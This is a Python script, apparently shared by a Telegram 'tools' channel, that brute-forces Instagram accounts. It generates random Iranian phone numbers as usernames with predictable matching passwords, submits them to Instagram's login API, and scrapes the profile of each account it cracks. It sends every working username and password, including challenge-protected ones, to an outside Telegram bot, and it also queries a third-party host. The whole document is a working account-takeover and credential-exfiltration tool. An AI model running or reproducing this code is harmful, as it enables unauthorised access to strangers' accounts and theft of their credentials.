try:
    import random, requests, os, uuid, time, secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
else:
    print("""
  _____                
 |  __ \               
 | |  | | _____      __
 | |  | |/ _ \ \ /\ / /
 | |__| |  __/\ V  V / 
 |_____/ \___| \_/\_/  
    Tele : @DewTools | @LordAbdulla                
                      """
)
    Dady = input(' Enter Your ID : ')
    tk = input(' Enter Your Bot Token : ')
    os.system('clear')
    def info(usr, pasw):
        global Dady, tk
        cookie = secrets.token_hex(8) * 2
        headr = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':'cookie', 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url2 = f"https://www.instagram.com/{usr}/?__a=1"
        ree = requests.get(url2, headers=headr).json()
        name = str(ree['graphql']['user']['full_name'])
        id = str(ree['graphql']['user']['id'])
        followers = str(ree['graphql']['user']['edge_followed_by']['count'])
        following = str(ree['graphql']['user']['edge_follow']['count'])
        isp = str(ree['graphql']['user']['is_private'])
        bio = str(ree['graphql']['user']['biography'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        datee = ree['data']
        lord = f" NEW HUNT ! \n Username : {usr} \n Password : {pasw} \n Name : {name} \n Followers : {followers} \n Following : {following} \n  Our Channel - @DewTools "
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage?chat_id={Dady}&text={lord}")
        print(lord)


    while True:
        chars = '0987654321'
        dadyA = '91'
        dadyl = str(''.join((random.choice(chars) for i in range(8))))
        fuck = str(''.join((random.choice(dadyA) for i in range(1))))
        user = '+98' + dadyA + dadyl
        pasw = '0' + dadyA + dadyl
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'User-Agent: Instagram 6.12.1 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-G531H; grandprimeve3g; sc8830; fr_FR)',  'Accept':'*/*',  'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':pasw,  'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            user = req_login.json()['logged_in_user']['username']
            info(user, pasw)
        elif '"message":"challenge_required","challenge"' in req_login.text:
            print(f" Secured Account :( {user}:{pasw} ")
            requests.post(f"https://api.telegram.org/bot{tk}/sendMessage?chat_id={Dady}&text=  Secure Hit:(!  \n  UserName : {user} \n  Password : {pasw} \n  - Our Channel : @DewTools ")

#Telegram : @DewTools
#Inst : @LordAbdulla
#Github : github.com/LordAbdulla
